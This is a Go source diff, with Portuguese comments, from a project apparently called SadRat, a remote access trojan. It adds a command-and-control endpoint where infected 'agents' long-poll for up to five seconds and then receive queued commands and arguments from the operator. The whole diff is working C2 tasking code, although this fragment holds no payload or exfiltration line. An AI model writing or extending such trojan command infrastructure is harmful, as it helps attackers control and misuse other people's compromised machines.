@@ -3,6 +3,8 @@ package presentation
 import (
 	"encoding/json"
 	"net/http"
+	"time"
+	"fmt"
 
 	"github.com/VitorDie/SadRat/internal/domain"
 	"github.com/google/uuid"
@@ -19,6 +21,7 @@ type CreateJobRequest struct {
 type Repository interface {
 	SaveAgent(agent domain.AgentRow) error
 	SaveJob(job domain.JobRow) error // Adicionamos a exigência de salvar o comando
+	GetJobForAgent(agentID string) (domain.JobRow, error) // Novo método
 }
 
 // ServerHTTP é a nossa API C&C
@@ -38,7 +41,7 @@ func (s *ServerHTTP) Router() http.Handler {
 	// Roteamento REST nativo do Go
 	mux.HandleFunc("POST /api/agents", s.handleGiveAnUUIDForAgentRequest)
 	mux.HandleFunc("POST /api/jobs", s.handleReceiveCommand) // Nova rota do Operador
-
+	mux.HandleFunc("GET /api/agents/{agent_id}/job", s.handleFetchJobForAgent) // Nova rota para buscar comandos
 	return mux
 }
 
@@ -85,4 +88,35 @@ func (s *ServerHTTP) handleReceiveCommand(w http.ResponseWriter, r *http.Request
 		"command":  jobRow.Command,
 		"args":     jobRow.Args,
 	})
+}
+
+// handleSendJobs é onde a mágica do Long Polling acontece
+func (s *ServerHTTP) handleFetchJobForAgent(w http.ResponseWriter, r *http.Request) {
+	// Extração nativa da variável da URL
+	agentID := r.PathValue("agent_id")
+
+	fmt.Printf("[DEBUG API] Rota acionada! AgentID extraído da URL: '%s'\n", agentID)
+
+	// Long Polling: O C&C "prende" o Agente por até 5 segundos procurando comandos
+	for i := 0; i < 5; i++ {
+		jobRow, err := s.repo.GetJobForAgent(agentID)
+		
+		if err == nil {
+			// Sucesso! Achamos um comando. Despachamos imediatamente pro Agente.
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusOK)
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"id":       jobRow.ID,
+				"command":  jobRow.Command,
+				"args":     jobRow.Args,
+			})
+			return
+		}
+
+		// Se não achou, o C&C dorme 1 segundo e tenta de novo (sem gastar CPU)
+		time.Sleep(1 * time.Second)
+	}
+
+	// Se passar os 5 segundos e não tiver comando, liberamos a conexão do Agente pacificamente
+	w.WriteHeader(http.StatusNoContent) // HTTP 204: Indica sucesso, mas sem dados
 }
